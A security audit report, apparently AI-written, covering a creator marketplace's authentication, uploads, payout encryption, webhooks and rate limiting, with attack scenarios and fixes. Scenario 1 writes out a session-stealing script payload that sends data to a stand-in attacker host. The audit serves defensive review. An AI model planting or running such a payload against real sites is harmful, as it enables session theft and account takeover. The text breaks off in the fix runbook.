# noizu.direct — Pre-launch Security Audit

**Date:** 2026-04-21
**Target:** `C:\Users\ruper\noizu-direct` — noizu.direct creator marketplace (SEA)
**Auditor role:** Senior application security engineer / staff pentest lead
**Scope:** Read-only source review. No credentials tested, no live traffic generated, no code modified.
**Stack:** Next.js 16 (App Router, modified per AGENTS.md), NextAuth v5 (JWT), Prisma + PostgreSQL (Supabase-hosted), Cloudflare R2 (primary blob store — **not** Supabase Storage), Airwallex (payments + payouts + disputes), Resend (email), Upstash Redis (cache), bcrypt, sharp, sanitize-html.
**Roles audited:** buyer, creator, admin (NextAuth ADMIN role + separate StaffUser system).

---

## 1. Executive summary

noizu.direct is a fundamentally serious codebase. The Airwallex webhook is signature-verified with constant-time comparison, rejects placeholder secrets, and uses atomic `updateMany` claims for idempotency — this is the single most important thing a payments-adjacent app has to get right, and it is correct here. Central auth guards (`requireAdmin`, `requireCreator`, `verifyProductOwnership`) exist and are used consistently. Payment-intent creation recomputes prices server-side from product IDs and applies discount codes with an atomic `usedCount` increment to prevent double-use. Download tokens for digital goods gate on auth, buyer match, expiry, and order status. Identity documents are routed to an R2 `private/` prefix and served through an auth-checked proxy with 5-minute signed URLs.

However, the app is **not ready for production launch**. A small number of high-impact issues, most of them easy to fix in a single afternoon, put real money, buyer PII, and creator banking details at risk. The two most dangerous findings are:

1. **Critical — fallback encryption key for creator bank / PayPal details.** If `PAYOUT_ENCRYPTION_KEY` is ever missing, the code silently substitutes the literal string `'placeholder_32_char_encryption_key'`. Combined with AES-256-**CBC** and no authentication tag, anyone who obtains a database dump (Supabase misconfig, leaked backup, contractor laptop) can decrypt every creator's bank details, SWIFT/IFSC numbers, and PayPal addresses offline in milliseconds. This is a financial-data breach waiting for an ops mistake.
2. **High — legacy avatar upload writes to local disk with a user-controlled file extension**, bypassing the hardened upload pipeline. Combined with GIF/SVG allow-listing on the main uploader, this provides multiple paths to ship attacker-controlled content out of `same-origin /uploads/…`.

Beyond those, there is no rate limiting on authentication endpoints (credential stuffing, email bombing, password-reset enumeration), view tracking accepts client-supplied `userId` and `ipAddress` (trending-score and analytics pollution), and creators can flip a product's `type` after creation in ways that bypass the initial type-gated validation. A small number of HTML emails interpolate admin- and user-supplied strings into `innerHTML` without escaping.

The overall shape of the app is defensible. With the items in section 8 fixed, launch would be responsible. Without them, the first public incident is foreseeable.

---

## 2. Severity legend

- 🔴 **Critical** — exploitable pre-auth or by any user, direct loss of money / PII / account takeover. Launch blocker.
- 🟠 **High** — exploitable by a low-privilege account, significant blast radius (bulk data, financial integrity, account abuse). Launch blocker.
- 🟡 **Medium** — exploitable with authenticated access and moderate impact (limited IDOR, abuse vectors, privacy leaks). Fix within first sprint.
- 🟢 **Low** — defence-in-depth, minor information disclosure, requires chained conditions. Fix at leisure.
- ⚪ **Info** — observations, hardening opportunities, and architectural concerns.

---

## 3. Threat model snapshot

**Actors in play:**
- **Unauthenticated internet user.** Can hit marketing pages, `/api/auth/register`, `/api/auth/forgot-password`, `/api/contact`, `/api/track/view`.
- **Authenticated buyer (role: BUYER).** Can purchase, message creators, open disputes, download purchased digital goods, upload avatar.
- **Authenticated creator (role: CREATOR).** All buyer abilities plus product CRUD, digital-file uploads, payout configuration, commission/milestone management.
- **Authenticated admin (role: ADMIN on User table).** Can manage users, creators, products, payouts, disputes, toggle maintenance mode. Also allowed to create `StaffUser` rows.
- **StaffUser (separate table, HMAC-signed cookie).** Parallel admin system with its own login and 5-attempt lockout.
- **Airwallex.** Trusted signed webhooks, but "signed" is the only thing keeping it trusted.
- **Cloudflare R2.** Blob storage for public uploads (`uploads/`) and private files (`private/`).
- **Supabase Postgres.** Data at rest. Supabase Storage is **not** used for blobs here.

**Trust boundaries to worry about:**
1. Browser → App Router route handlers (almost all mutations go through `/api/*`).
2. Airwallex → `/api/airwallex/webhook` (HMAC-SHA256 verified — good).
3. Vercel/Cron → `/api/cron/*` (CRON_SECRET bearer).
4. App → R2 (access-keyed S3 client).
5. App → Postgres (DATABASE_URL; the same process has the key to decrypt payout details at rest).
6. NextAuth ADMIN → StaffUser creation surface (two admin systems blurring into one).

**Assets ranked by badness-if-lost:**
1. Creator bank / PayPal payout details (stored encrypted in `CreatorProfile.payoutDetails`).
2. Airwallex API credentials + webhook secret (env-only).
3. Buyer PII (name, email, address, order history).
4. Identity documents (uploaded to R2 `private/identity/`).
5. Session cookies / NEXTAUTH_SECRET.
6. Product digital files (`private/` scope, gated by per-token download link).
7. Reputation (rating manipulation, trending manipulation, fake reviews).

---

## 4. Findings by category

### 4.1 Authentication (AuthN)

**🟠 H-1. No rate limiting on login, register, or forgot-password.**
`src/lib/auth.ts` uses NextAuth Credentials with `bcrypt.compare(...)` (10 rounds), but no attempt throttling. `src/app/api/auth/register/route.ts` and `src/app/api/auth/forgot-password/route.ts` are likewise unthrottled. The only in-memory IP throttle in the codebase is in `src/app/api/contact/route.ts` (3/hour). Upstash Redis is configured (`@upstash/redis` is installed and used for other caching) but is not applied to auth.
- **Attack:** credential-stuffing at tens of thousands of attempts/min (bcrypt at 10 rounds is ~60–80ms; a single vCPU pins at <20 req/s per IP but a botnet easily overwhelms this). Password-reset email bombing of a known address (no per-email throttle either). Pre-launch user enumeration via different error messages on register vs login.
- **Fix:** Upstash Redis-backed sliding-window limiter on `/api/auth/*`, keyed on both IP and (for login) email. Add a captcha after N failures on the same email.

**🟡 M-1. No email verification gate on account creation.**
`src/app/api/auth/register/route.ts` creates an active BUYER account and NextAuth Google OAuth auto-creates users too. A buyer can purchase, message creators, and leave reviews from an unverified throwaway email. This matters for chargeback abuse and review bombing.
- **Fix:** `emailVerifiedAt` on `User`; gate reviews and checkout on verification (or at minimum gate message-send until verified for buyers).

**🟡 M-2. Login returns generic 401 but register returns 409 on email taken — timing/enumeration on `/api/auth/register`.**
A stranger can probe `/api/auth/register` to confirm whether an email is registered (409 vs 201).
- **Fix:** Always return the same generic success-or-pending response; send a "this email is already registered, try logging in" email out-of-band.

**🟢 L-1. Bcrypt cost factor 10 for users, 12 for staff.**
Users should be bumped to 12 as well. Cost 10 is survivable but on the weak end for a 2026 launch.

**⚪ I-1. `NEXTAUTH_SECRET` documented in `.env.example`, no rotation plan observed.**
Consider documenting a rotation runbook — rotating this invalidates all JWTs and staff HMAC tokens (same `AUTH_SECRET`).

### 4.2 Authorization / IDOR

The app's central authorization story is actually quite good. `src/lib/guards.ts` exports `requireAdmin`, `requireCreator`, `requireCreatorProfile`, `verifyProductOwnership`, and `getOwnedByCreator`. They're used consistently across admin and creator-scoped handlers. Conversation endpoints (`src/app/api/messages/[conversationId]/route.ts`) validate buyer/creator membership. Notification read/unread endpoints validate ownership. Order download tokens validate buyer match.

**🟠 H-2. `PATCH /api/products/[id]` allows the owning creator to change a product's `type`.**
`src/app/api/products/[id]/route.ts` verifies ownership via `verifyProductOwnership`, then accepts a body that passes `type` straight through. A creator can create a `PHYSICAL` product (which bypasses the create-time "digitalFiles required" check in `POST /api/products`) and then PATCH it to `DIGITAL` — the product then exists as a DIGITAL listing with no digital files. The download-token generator in the webhook still creates tokens for orders against this listing. Depending on the download route's tolerance for empty file arrays, buyers paying for a "digital" product may get an empty or broken download, which becomes a guaranteed dispute-win for the buyer and a chargeback vector against the creator/platform.
- **Fix:** either disallow `type` mutation entirely, or gate `type` transitions through a server-side validator that re-runs the create-time invariants (digital files present for DIGITAL, shipping config for PHYSICAL, milestones for COMMISSION, etc.).

**🟡 M-3. `POST /api/messages` does not enforce an existing conversation relationship.**
An authenticated buyer can message any creator by knowing their user ID. In a marketplace this is usually intentional (pre-purchase inquiries) but without rate limiting it becomes a harassment / spam vector. Consider a "only after a product page visit" or "only N unsolicited messages per day" rule.

**⚪ I-2. `POST /api/admin/staff` lets any NextAuth ADMIN create a StaffUser.**
The split between the NextAuth `role=ADMIN` concept and the `StaffUser` table is blurred. A single compromised NextAuth admin account can mint a new StaffUser with its own separate login, survive a NextAuth password reset, and persist. Consider requiring a dual-control flow or restricting StaffUser creation to a superuser flag.

### 4.3 Admin surfaces

**🟢 L-2. Admin bulk operations are well-scoped.**
`src/app/api/admin/creators/bulk/route.ts` uses an action allowlist (`verify|suspend|unsuspend|archive`). `src/app/api/admin/products/[id]/route.ts` only allows `isActive`. `src/app/api/admin/finance/route.ts` uses a single `$queryRaw` with hardcoded SQL (no user interpolation). These are in good shape.

**🟡 M-4. Admin email templates interpolate untrusted strings into HTML.**
`src/app/api/admin/applications/[id]/route.ts` and `src/app/api/creator/apply/route.ts` build Resend email HTML via template literals using admin-supplied `rejectionReason`, user-supplied `name`, `username`, and `email`. Not a web XSS (email clients sandbox, and the only consumer is the applicant's inbox), but (a) you can smuggle `<script>`/`<style>` into the admin's outbound audit trail, and (b) legitimate names containing `<` break rendering. Run these through a minimal HTML encoder before interpolation.

**⚪ I-3. Maintenance-mode toggle is admin-only and writes a `PlatformSettings` row.**
Enforced via `src/middleware.ts` which fetches that row. Relies on the internal fetch succeeding; if the DB is down, the middleware's behavior on error should be "fail closed" (show maintenance) for the admin's own intent — confirm this is the case in the middleware's try/catch.

### 4.4 Input validation

**🟡 M-5. Product create / update accepts unvalidated enum-like fields.**
`src/app/api/products/route.ts` passes `type` and `category` straight to Prisma. Prisma will reject values outside the enum, but the `400` error leaks the enum via Prisma's error message. More importantly, fields like `podVariants`, `commissionTiers`, `shippingZones` are passed through without shape validation. A malformed `shippingZones` array could later crash the checkout price calculator.
- **Fix:** Zod schema per product type. The code already imports `zod` elsewhere (register route). Apply it here uniformly.

**🟢 L-3. `title` and `description` are not HTML-escaped or length-capped on input.**
They are rendered via React (auto-escaped) in listing pages, which neutralizes HTML injection in product pages. But blog/CMS surfaces use `sanitize-html` — confirm every surface that renders description uses React or sanitize-html, never `dangerouslySetInnerHTML` with raw text. Add a `maxLength` on description (e.g., 10 000 chars) to prevent DoS via giant listings.

**⚪ I-4. Zod is used inconsistently.**
Only `/api/auth/register` uses it in any disciplined way. A standard "validate with zod before DB write" pattern applied across every mutating route would prevent an entire class of bugs with one PR.

### 4.5 SQL / ORM safety

**🟢 Good.** The codebase uses Prisma parameterized queries throughout. The only `$queryRaw` observed (`src/app/api/admin/finance/route.ts`) uses a hardcoded SQL string with no user interpolation. No `$executeRawUnsafe` was found during sweep.
- Keep an eye on future migrations: any new `$queryRaw` must use Prisma's tagged-template form (`` Prisma.sql`...${var}` ``), never string concatenation.

### 4.6 XSS

**🟡 M-6. Public upload of `image/svg+xml` is allowed.**
`src/app/api/upload/route.ts` allows SVG under `ALLOWED_IMAGE_TYPES` and in the non-sharp branch **keeps the SVG bytes verbatim** and stores them in R2 at the `uploads/` (public) prefix, returning a URL served on the R2 public domain. SVGs embed `<script>`. If anywhere in the app the R2 public URL is rendered inside the app's own origin (e.g., a `<img src="...svg">` is fine, but an `<iframe>` or a direct link open in the same tab on the app domain via a redirect will run the SVG's JS in that origin), this becomes stored XSS. Even served from R2's own domain, an SVG used as a "profile_logo" or "profile_banner" that ends up in a Next `<Image>` component bypasses the sanitizer.
- **Fix:** either strip SVG from `ALLOWED_IMAGE_TYPES`, or run svgo / DOMPurify's SVG profile on SVG bodies before upload, or restrict SVG to the `profile_logo` category with a strict server-side sanitize step. Given how little creators will miss SVG uploads, dropping it is the cleanest answer.

**🟢 L-4. User HTML content (blog, CMS) is sanitized via `sanitize-html`.**
Configuration should be reviewed — default allow-lists permit `<a href>`, which can carry `javascript:` URIs if the schemes list isn't explicitly set. Verify the schemes allowlist is `['http','https','mailto']`.

**⚪ I-5. No Content-Security-Policy header.**
`next.config.ts` sets X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy — but no CSP. A reasonable starting CSP (`default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.r2.dev https://<r2-public-domain>; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.airwallex.com https://*.upstash.io`) would blunt the impact of any XSS.

### 4.7 CSRF

NextAuth + JWT cookies with `SameSite=Lax` (the v5 default) mean most state-changing routes are naturally protected against cross-site POSTs. Observed: the app does not validate `Origin` / `Referer` headers explicitly.

**🟢 L-5. Top-level navigation CSRF (`SameSite=Lax` exception).**
A cross-site `<form method="POST">` submitted via user click can still fire for `SameSite=Lax` cookies. Verify that no mutating GETs exist (e.g., "click to approve payout" links in admin emails). If such links exist, they should POST through a form on an in-app confirmation page.

### 4.8 Open redirect

**⚪ I-6. No `next=` / `returnTo=` parameters observed on login.**
If you add one (common pattern), validate that it's a relative path (`startsWith('/')` and does not start with `//`).

### 4.9 SSRF

**🟢 Good.** No routes observed that take a user-supplied URL and fetch it server-side. The image proxy does not exist; Next's `next/image` loader is configured with a domains allowlist.

### 4.10 File upload

**🔴 C-1 (see section 8 headline).** `POST /api/account/profile` — legacy avatar upload.
`src/app/api/account/profile/route.ts` lines 42–68 write user-uploaded avatars directly to the local disk at `public/uploads/avatars/${userId}.${ext}` with `ext = file.name.split('.').pop()?.toLowerCase()`. It checks `file.type` is a raster image MIME, but that's a client-declared header. The extension is taken from the filename verbatim. Problems:
- A user can upload `evil.html` with `Content-Type: image/png` — the MIME check passes (the raw body isn't inspected), the file is written as `public/uploads/avatars/<userId>.html`, and Next static-serves it at `/uploads/avatars/<userId>.html` on the app origin. Same-origin HTML = XSS with session cookies, access to the NextAuth `/api/auth/session` endpoint, ability to read JSON, and CSRF of every mutation for that user or any other logged-in user who visits the link.
- No size limit. No quota integration. Bypasses `checkUploadAllowed`.
- Writes to the app's working directory on Vercel (ephemeral FS); on serverless deployments this file vanishes after the next cold start — so the avatar URL stored in `User.avatar` points to a 404 — but the attack still works in the window before cold-start, and works indefinitely on non-serverless deployments.
- Also bypasses the WebP-conversion defense the main upload route uses, keeps EXIF (privacy leak), and can be abused as arbitrary-filename write under `public/` — the extension split on `.` means a filename like `x.svg` or `x.html` or `x.js` is honored.

**Fix:** delete this route. The hardened pipeline at `/api/upload` already supports avatar uploads (`category: 'profile_avatar'`). Update the client code to call it.

**🟡 M-7. SVG in `/api/upload` (covered in 4.6 M-6).**

**🟡 M-8. Image-type validation is by `File.type` (client-supplied) only.**
`src/app/api/upload/route.ts` checks `ALLOWED_TYPES.has(file.type)`. Sharp converts most uploads to WebP, which incidentally validates the image by re-encoding, so a non-image uploaded as `image/png` will fail at the sharp step and fall through to the `catch` which **stores the original bytes** with the user's original extension. A PDF sent as `application/pdf` is never re-encoded.
- **Fix:** either (a) remove the sharp `catch` fallback that saves the original — if sharp fails, reject — or (b) use `file-type` / magic-byte sniffing before the MIME-string check.

**🟢 L-6. Digital file upload cap at 200 MB.**
`src/app/api/upload/digital/route.ts` has an extension allowlist and 200 MB cap. Confirm Vercel's request body limit matches. `next.config.ts` sets `bodySizeLimit: 10mb` for server actions — server actions are different from route handlers, but if a future refactor moves uploads to server actions, you'll silently truncate large files.

**⚪ I-7. `/api/files/[...path]` proxy.**
Validates auth, identity/dispute-evidence require admin, has a `..` path-traversal guard, returns an R2-signed URL with 5-minute TTL. Good. Confirm the `..` guard also rejects URL-encoded `%2e%2e`.

### 4.11 Storage (R2) policies

**🟢 L-7. R2 keys follow `private/<category>/<uuid>.<ext>` vs `uploads/<category>/<uuid>.<ext>`.**
Filenames are UUIDv4 (unpredictable). Public bucket is served through R2's public URL. Private bucket is served through `/api/files/...` with short-TTL signed URLs. This is the right shape.

**⚪ I-8. R2 bucket configuration not visible from source.**
Confirm in the Cloudflare dashboard: (a) the private bucket is **not** public (no "public access" policy or custom domain); (b) CORS on the public bucket does not include `*` for `Access-Control-Allow-Origin` if credentials are involved; (c) lifecycle rules exist to expire orphaned uploads (for users who abandon a product draft).

**⚪ I-9. Storage-quota accounting.**
`Media` records are only created for quota-counted categories, and tied to the uploader. There is no observed cleanup job that deletes orphaned R2 objects when a `Media` row or `Product` is hard-deleted. Over six months this can accumulate. Add a weekly reaper.

### 4.12 Secret management

**🔴 C-2 (see section 8 headline).** `PAYOUT_ENCRYPTION_KEY` has a placeholder fallback.
`src/app/api/admin/payouts/[id]/route.ts` lines 9–11:
```
const KEY = Buffer.from(
  (process.env.PAYOUT_ENCRYPTION_KEY ?? 'placeholder_32_char_encryption_key').padEnd(32, '0').slice(0, 32)
)
```
The same pattern appears in `src/app/api/dashboard/payout/settings/route.ts` and `src/app/api/cron/payout/route.ts`.

Three problems stacked:
1. **Fallback to a constant string.** If the env var is ever missing (bad deploy, redacted staging copy, local tooling, misconfigured `.env` in a container rebuild), the code encrypts and decrypts with the literal `'placeholder_32_char_encryption_key'` — which is in the source tree of this report and anyone with a GitHub search. An attacker with a leaked DB backup (Supabase is a common target for misconfig-leaked backups) would decrypt every `payoutDetails` row offline in seconds.
2. **AES-256-CBC with no authentication.** CBC without HMAC is malleable — an attacker who can write the ciphertext column (e.g., SQL injection, compromised admin) can flip bits to change the plaintext bank details. AES-GCM should be used instead.
3. **Key derivation via `.padEnd(32, '0').slice(0, 32)`.** The key space is effectively the first 32 ASCII characters of whatever string you supplied; there is no KDF. If an operator types a short password, the key is just that password padded with zeros. No salt, no Argon2.

**Fix:**
- Throw at process start if `PAYOUT_ENCRYPTION_KEY` is missing. No fallbacks. Ever.
- Migrate to AES-256-GCM (`createCipheriv('aes-256-gcm', ...)`) with per-record random IV and AAD bound to the record id.
- Require the key to be 32 random bytes, base64-encoded; decode before use. Reject any key that decodes to less than 32 bytes.
- Plan a re-encryption migration for existing rows when you do this.

**⚪ I-10. `.env.example` is complete and well-commented.**
Do audit production env in Vercel / your deploy target for: `NEXTAUTH_SECRET`, `AUTH_SECRET`, `AIRWALLEX_WEBHOOK_SECRET`, `PAYOUT_ENCRYPTION_KEY`, `CRON_SECRET`, `DATABASE_URL`, `RESEND_API_KEY`, `R2_*`. Each must be set, rotated on a schedule, and absent from any committed file.

**⚪ I-11. Git history scan recommended.**
I couldn't run `git log --all --diff-filter=A -- '**/.env*' '**/*.pem'` as part of this audit (bash sandboxing). Please run that pre-launch — any past commit of a real env file should trigger a full secret rotation and history rewrite.

### 4.13 Rate limiting

Summarizing 4.1 and 4.2:
- `/api/contact` — in-memory 3/hr/IP, honeypot, regex XSS detection, CSP on response. Good.
- Everything else — none.

**🟠 H-3. No rate limit on `/api/track/view`.**
Combined with the next finding, this lets anyone inflate any product's trending score to the top of the discovery algorithm.

**🟠 H-4. `/api/track/view` accepts client-supplied `userId` and `ipAddress`.**
`src/app/api/track/view/route.ts` accepts JSON body `{ productId, sessionId, userId, ipAddress }` with **no authentication** and **no derivation of IP from request headers**. The dedupe check uses the client-supplied IP. An attacker rotates the `ipAddress` field through a list and inflates view count arbitrarily. Because discovery ranking uses `trendingScore` (per the codebase's own ranking memory notes), this directly manipulates the marketplace's "For You" page.
- **Fix:** derive IP from `req.headers.get('x-forwarded-for')` (trusting Vercel/Cloudflare's CF-Connecting-IP) server-side; drop the client fields; rate-limit by derived IP in Redis.

**🟡 M-9. No rate limit on `/api/messages` send.**
Spam / harassment vector. Add 30-msg/hour/sender limit.

**🟡 M-10. No rate limit on `/api/upload`.**
Storage-quota handles disk cost, but doesn't stop a creator from firing thousands of tiny uploads and exhausting R2 request budget / racking up bill.

### 4.14 Payment integrity

**🟢 This area is the strongest part of the codebase.**
- `/api/airwallex/payment-intent` recomputes prices server-side from product IDs. Client-supplied prices are ignored.
- Discount codes are validated server-side with an atomic `updateMany` on `usedCount < usageLimit` — no TOCTOU.
- `/api/airwallex/webhook` verifies HMAC-SHA256 with `timingSafeEqual`, rejects missing/placeholder secrets explicitly, claims orders with an atomic `updateMany` PENDING→PROCESSING to guarantee idempotency.
- Platform fees are centralized in `src/lib/platform-fees.ts` (getProcessingFeeRate, feeFromGross) — no more hardcoded 0.025 drift.
- Dispute handling updates escrow status and creates FraudFlag entries.
- Payout execution via `/api/admin/payouts/[id]` is ADMIN-gated, audit-logged, and emails the creator.

**🟡 M-11. Webhook handlers do work asynchronously (`void` IIFEs) but return 200 immediately.**
`src/app/api/airwallex/webhook/route.ts` lines 734+ dispatch to `void handlePaymentSucceeded(...)` and return 200 before processing completes. On Vercel serverless, the function may terminate before the async work finishes — Next.js App Router on Vercel kills background promises on response. This means intermittently, webhook handlers will "succeed" (HTTP 200) but never actually run to completion. The idempotency pattern saves you from double-processing when Airwallex retries, but if a transient DB error occurs mid-processing the claim has already been taken — the order stays in PROCESSING with no transaction row, no email, no notification.
- **Fix:** `await` the handler. Return 200 only after it completes. If it takes >10s, move to a queue (Upstash QStash or Inngest) and record the event to an `InboundWebhookEvent` table first, process out-of-band, then mark processed.

**🟡 M-12. Storage-subscription renewal webhook matching is non-deterministic.**
`handleStoragePaymentSucceeded` comment admits: "Without a lastRenewalIntentId column, we rely on the cron's synchronous behavior…" and the function returns `false` in the renewal path. This is a latent bug — renewals *can* get into inconsistent states. Add `lastRenewalIntentId` to `StorageSubscription`, set it in the cron before charging, match on it in the webhook.

**🟢 L-8. `amountUsd` is stored in cents (integer), `feeFromGross` operates on gross — this was a recent fix (per memory, commit `5a3ca86`).**
The recent Phase 0 refactor removed a double-fee bug. Confirm all email / invoice rendering is on the corrected path.

**⚪ I-12. Dispute / chargeback flow.**
`handleDisputeCreated` creates a `ChargebackDispute` with `evidenceDeadline` parsed from the Airwallex payload without validation. A malformed date string creates `Invalid Date`. Add `isFinite(d.getTime())` guard.

### 4.15 Sessions & cookies

**🟢 Good.** NextAuth v5 with JWT strategy. Default cookie settings are `HttpOnly`, `SameSite=Lax`, `Secure` in production. Staff system uses a separate HMAC-signed cookie (`src/lib/staffAuth.ts`) with 12h TTL and `timingSafeEqual` verification.

**🟢 L-9. Staff cookie lifetime (12h) is reasonable.**
Confirm it's set `Secure` and `HttpOnly`.

**⚪ I-13. No observed session invalidation on password change.**
NextAuth JWT sessions are not invalidated by password change (JWTs don't hit the DB). For a marketplace with payout powers, consider a `sessionsInvalidatedAt` column on `User` and validating it in the `jwt` callback.

### 4.16 CORS

**⚪ I-14. No CORS middleware observed.**
Route handlers run with Next's default (same-origin only). Confirm no public API routes are ever called cross-origin. R2 has its own CORS story — confirm there too.

### 4.17 Logging & PII

**🟡 M-13. `EmailLog` stores full `to` addresses.**
A DB leak exposes every notified user's email. Consider hashing + salting the `to` field, or truncating (`u****@domain.com`).

**🟡 M-14. `AuditEvent` stores `reason` verbatim.**
If a reason string is user-supplied anywhere (it is, for rejection reasons), make sure it's length-capped and not rendered back into admin HTML without escaping.

**⚪ I-15. `console.error` / `console.warn` usage.**
These flow to Vercel logs. Do not log secrets. Do not log full payloads. A quick grep before launch for `console.log.*session` / `console.log.*token` is worth doing.

### 4.18 Dependency vulnerabilities

Could not run `npm audit --production` in this audit (bash sandboxing). Do that pre-launch and publish the output. Pin `sharp`, `sanitize-html`, `next-auth@beta`, `@auth/prisma-adapter`, and `jsonwebtoken` to specific versions. Known high-priority watch items:
- `sharp`: vuln-prone (libvips CVEs). Keep current.
- `@auth/prisma-adapter` + `next-auth`: breaking changes common.
- `resend`: stable, low risk.
- `@aws-sdk/client-s3`: large surface, keep current.

### 4.19 ToS / abuse bypass

**🟡 M-15. New creator commission auto-accept window is 48h.**
If a creator account is compromised, the attacker has a 48h window to accept commissions and drain milestone deposits. Consider a shorter window for new creators, or a "high-value commission requires 2FA" gate.

**🟡 M-16. Creator self-purchase / rating self-boost.**
No observed check that prevents a creator from purchasing their own product (via a second account) to leave a glowing review. Add an "email domain + payment instrument + IP" soft-match check on reviews.

**⚪ I-16. Chargeback fraud detection.**
`handleDisputeCreated` creates a `FraudFlag` with `HIGH` severity on every chargeback. Good as a signal. A downstream worker should suspend the buyer on N chargebacks.

### 4.20 OWASP Top 10 (2021) mapping

| OWASP | Applied to this app | Notable finding IDs |
|-------|---------------------|----------------------|
| A01 Broken Access Control | Largely strong via guards; one IDOR-adjacent gap | H-2 |
| A02 Cryptographic Failures | Placeholder AES key, CBC-no-MAC | C-2 |
| A03 Injection | Prisma parameterized; minor HTML-in-email | M-4 |
| A04 Insecure Design | Two admin systems (NextAuth + StaffUser) bleed | I-2 |
| A05 Security Misconfiguration | No CSP, fallback secrets, missing rate limits | I-5, H-1, C-2 |
| A06 Vulnerable Components | Unknown — `npm audit` not run | pending |
| A07 AuthN Failures | No email verify, no rate limit, no lockout on credentials | H-1, M-1 |
| A08 Software/Data Integrity | Webhook HMAC good; CBC-no-MAC on payouts is ciphertext-malleable | C-2 |
| A09 Logging/Monitoring | Audit log present; PII in email log; no SIEM sinks visible | M-13 |
| A10 SSRF | No observed SSRF surface | — |

---

## 5. Concrete attack scenarios

**Scenario 1 — Stored XSS → admin takeover via avatar.**
1. Attacker registers a regular buyer account.
2. Uploads `evil.html` via `POST /api/account/profile` with `Content-Type: image/png`. File contains `<script>fetch('/api/auth/session').then(r=>r.json()).then(j=>navigator.sendBeacon('https://attacker.example/', JSON.stringify(j)))</script>`.
3. MIME check on `file.type` passes; file is written to `public/uploads/avatars/<userId>.html`.
4. Attacker shares link `https://noizu.direct/uploads/avatars/<userId>.html` on Discord, or embeds it in a product description as `<a href>`.
5. Any logged-in user who clicks — including an admin in the middle of reviewing applications — ships their session to the attacker.
6. Attacker reuses the JWT on another machine. Browses `/admin`. Has admin powers until session TTL expires.
**Mitigation:** delete `POST /api/account/profile`, reroute avatars through `/api/upload`.

**Scenario 2 — Creator bank-details theft via DB backup.**
1. Ops engineer restores a 2-month-old Supabase backup to a staging environment to investigate a bug.
2. The staging environment doesn't have `PAYOUT_ENCRYPTION_KEY` in its env (copy-paste missed it). The code happily falls back to `'placeholder_32_char_encryption_key'.padEnd(32,'0').slice(0,32)`.
3. Ops engineer runs a normal admin-panel operation. Every `CreatorProfile.payoutDetails` record decrypts with the placeholder key — because they were encrypted in production with the **real** key (so decryption fails silently per the `catch { return '' }`)… but what if prod has ever briefly been missing the env? Check deploy logs.
4. Worst case: any `payoutDetails` row written during an outage of the real key is stored with the placeholder. A contractor with read-only DB access can decrypt it offline.
**Mitigation:** throw on missing key, migrate to AES-GCM with random per-record IV+AAD, key from base64 32-byte secret.

**Scenario 3 — Trending-score manipulation → fake featured creator.**
1. Attacker writes a 10-line Node script that POSTs to `/api/track/view` with a target `productId`, a random `ipAddress` from a pool of 10 000 random IPs, and a fresh `sessionId` each time.
2. Script runs for 2 hours. 100 000 views inserted.
3. The discovery algorithm pushes that product to the homepage's "For You" section.
4. Product is a rug-pull digital listing that pays on escrow-release 48h later. By the time the real fraud is reported, the attacker has been paid out.
**Mitigation:** server-side IP, auth required (or honest ephemeral anon-session ID), rate limit.

**Scenario 4 — Credential stuffing → account takeover → payout redirect.**
1. Attacker takes a public credential-dump list, fires 20 000 attempts at `/api/auth/callback/credentials`.
2. A small percentage succeed. Attacker logs in as a creator.
3. Attacker updates `payoutDetails` via `/api/dashboard/payout/settings` to point at their own bank/PayPal.
4. Next payout cycle, the attacker receives the creator's balance.
**Mitigation:** rate-limit login, email-notify creator on payoutDetails change, require re-auth (password or 2FA) for payoutDetails change, 24h cooldown before first payout with new details.

**Scenario 5 — Webhook delivery truncation → stuck orders.**
1. Buyer pays. Airwallex fires webhook. Handler enters `handlePaymentSucceeded`, atomically claims the order (now PROCESSING), starts processing.
2. Before the transaction row is created, the Vercel function receives SIGTERM (cold path closure) because it already returned 200.
3. Airwallex sees 200, never retries.
4. Order is stuck in PROCESSING. Buyer doesn't get the download email. Creator doesn't see the order. Money is held, product never delivered.
**Mitigation:** `await` the handler; or persist webhook to DB and process via queue.

---

## 6. Pre-launch blockers

These must be fixed before the first external user hits production:

1. **C-2** — `PAYOUT_ENCRYPTION_KEY` fallback. Throw on missing, migrate to AES-GCM.
2. **C-1** — Delete `POST /api/account/profile` avatar upload. Route to `/api/upload`.
3. **H-1** — Rate limit `/api/auth/*` (login, register, forgot-password) and `/api/auth/reset-password`.
4. **H-2** — Forbid `type` mutation on `PATCH /api/products/[id]`.
5. **H-3 + H-4** — Fix `/api/track/view`: derive IP server-side, drop client `userId`, rate limit.
6. **M-6 (SVG)** — Drop `image/svg+xml` from `ALLOWED_IMAGE_TYPES` in `/api/upload` or sanitize via DOMPurify-SVG.
7. **M-11** — `await` webhook handlers (or introduce queue).
8. **I-8** — Verify R2 private bucket has no public access or CORS * rule, and public bucket CORS doesn't echo credentials.
9. **I-11** — Run `git log --all --diff-filter=A -- '**/.env*'`. Rotate any secret ever committed.
10. **I-6 / deps** — Run `npm audit --production`. Triage any HIGH/CRITICAL.

---

## 7. Top 10 prioritized findings

| # | ID | Sev | Title | Effort |
|---|----|-----|-------|--------|
| 1 | C-2 | 🔴 | `PAYOUT_ENCRYPTION_KEY` fallback to placeholder + AES-CBC no MAC | M |
| 2 | C-1 | 🔴 | Legacy avatar upload writes user-controlled extension to `public/` | S |
| 3 | H-1 | 🟠 | No rate limit on login, register, forgot-password | S |
| 4 | H-2 | 🟠 | Creator can flip product `type` post-create, bypassing invariants | S |
| 5 | H-3/H-4 | 🟠 | `/api/track/view` is unauth + accepts client IP + no rate limit | S |
| 6 | M-6 | 🟡 | Public SVG uploads kept verbatim | S |
| 7 | M-8 | 🟡 | MIME-type trust + sharp-fails-fallback keeps original bytes | S |
| 8 | M-11 | 🟡 | Webhook handlers fire-and-forget on Vercel serverless | M |
| 9 | M-1 | 🟡 | No email verification before buyer can act | M |
| 10 | M-7 | 🟡 | No rate limit on `/api/messages`, `/api/upload` | S |

Effort: S = <1 day, M = 1–3 days, L = multi-week.

---

## 8. Quick-win fixes (copy-paste runbook)

**1. Delete the legacy avatar route.**
Remove `src/app/api/account/profile/route.ts`'s `POST` handler. Update client avatar upload to call `POST /api/upload` with `FormData({ file, category: 'profile_avatar' })`, then PATCH the `User.avatar` column from the returned URL.

**2. Fail loudly on missing payout key.**
